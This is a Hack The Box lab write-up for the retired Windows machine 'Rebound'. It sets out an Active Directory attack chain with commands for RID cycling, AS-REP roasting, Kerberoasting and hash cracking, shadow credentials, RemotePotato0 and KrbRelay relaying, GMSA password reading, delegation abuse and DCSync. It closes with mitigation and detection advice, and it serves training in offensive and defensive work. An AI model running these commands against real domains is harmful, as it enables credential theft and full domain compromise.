---
machine: Rebound
os: Windows
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [windows, active-directory, kerberos, acl, gmsa, rbcd, relay]
---

# Rebound — Hack The Box (Windows)

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Reference note; no real flags or credentials.

## TL;DR

Active Directory domain with RID cycling to enumerate users. AS-REP roasting plus Kerberoasting cracks a service account; an ACL allows a password change or shadow credentials. RemotePotato0 and KrbRelay capture the next hash, the GMSA password is read, and constrained delegation plus RBCD leads to DCSync.

## Recon

```bash
nmap -Pn -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 <IP>
```

- Ports: DNS, Kerberos, LDAP, SMB, WinRM and AD services.
- Services: Domain controller and domain-joined Windows hosts.
- Technologies: Active Directory, Kerberos, ACLs, GMSA, delegation and RBCD.

## Enumeration

- Domain `<DOMAIN>` and DC `<DC>`.
- User enumeration through RID cycling.
- Accounts without preauthentication and Kerberoastable SPNs.
- Weak ACLs on groups and users.

## Foothold

Obtain a user list and run AS-REP roasting and Kerberoasting. The cracked hash belongs to a service account whose password is shared by a domain user; an ACL allows control over an account with WinRM.

```bash
netexec smb <DC> -u guest -p '' --rid-brute
impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC> -usersfile users.txt -format hashcat
impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip <DC> -request
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

## Lateral movement

The ACL enables a password change or a shadow credential on another account. RemotePotato0 and KrbRelay capture the next session hash; that user can read the GMSA password of a service account.

## Privilege escalation

The service account has constrained delegation. Abuse it together with RBCD to obtain a ticket as the DC machine account and run DCSync.

```bash
certipy shadow auto -u <USER>@<DOMAIN> -p '<PASS>' -account <TARGET>
RemotePotato0.exe -r <ATTACKER> -s <SESSION>
KrbRelay.exe -spn ldap/<DC> -clsid <CLSID> -rbcd <TARGET>
gMSADumper.py -u <USER> -p '<PASS>' -d <DOMAIN>
impacket-getST -spn cifs/<DC> -impersonate '<DC>$' <DOMAIN>/<USER>:<PASS>
secretsdump.py -k -no-pass <DOMAIN>/<DC>$@<DC>
```

## Evidence

- Users enumerated through RID cycling.
- Cracked AS-REP/TGS hashes and a created shadow credential.
- Machine-account ticket and DCSync dump.

## Lessons learned

- AD chains small flaws: an ACL, an SPN and a weak delegation.
- GMSA passwords are not immune if the object can be read.
- RBCD and constrained delegation must be audited together.

## Mitigation and detection

- Review ACLs, SPNs and accounts without preauthentication.
- Restrict delegation and protect GMSA objects.
- Monitor RID cycling, Kerberoasting and shadow-credential changes.

## References

- [0xdf — Rebound](https://0xdf.gitlab.io/2024/03/30/htb-rebound.html)
- [IppSec — Rebound](https://www.youtube.com/watch?v=oUIoH4yBT3k)
- [Hack The Box — Rebound](https://app.hackthebox.com/machines/rebound)
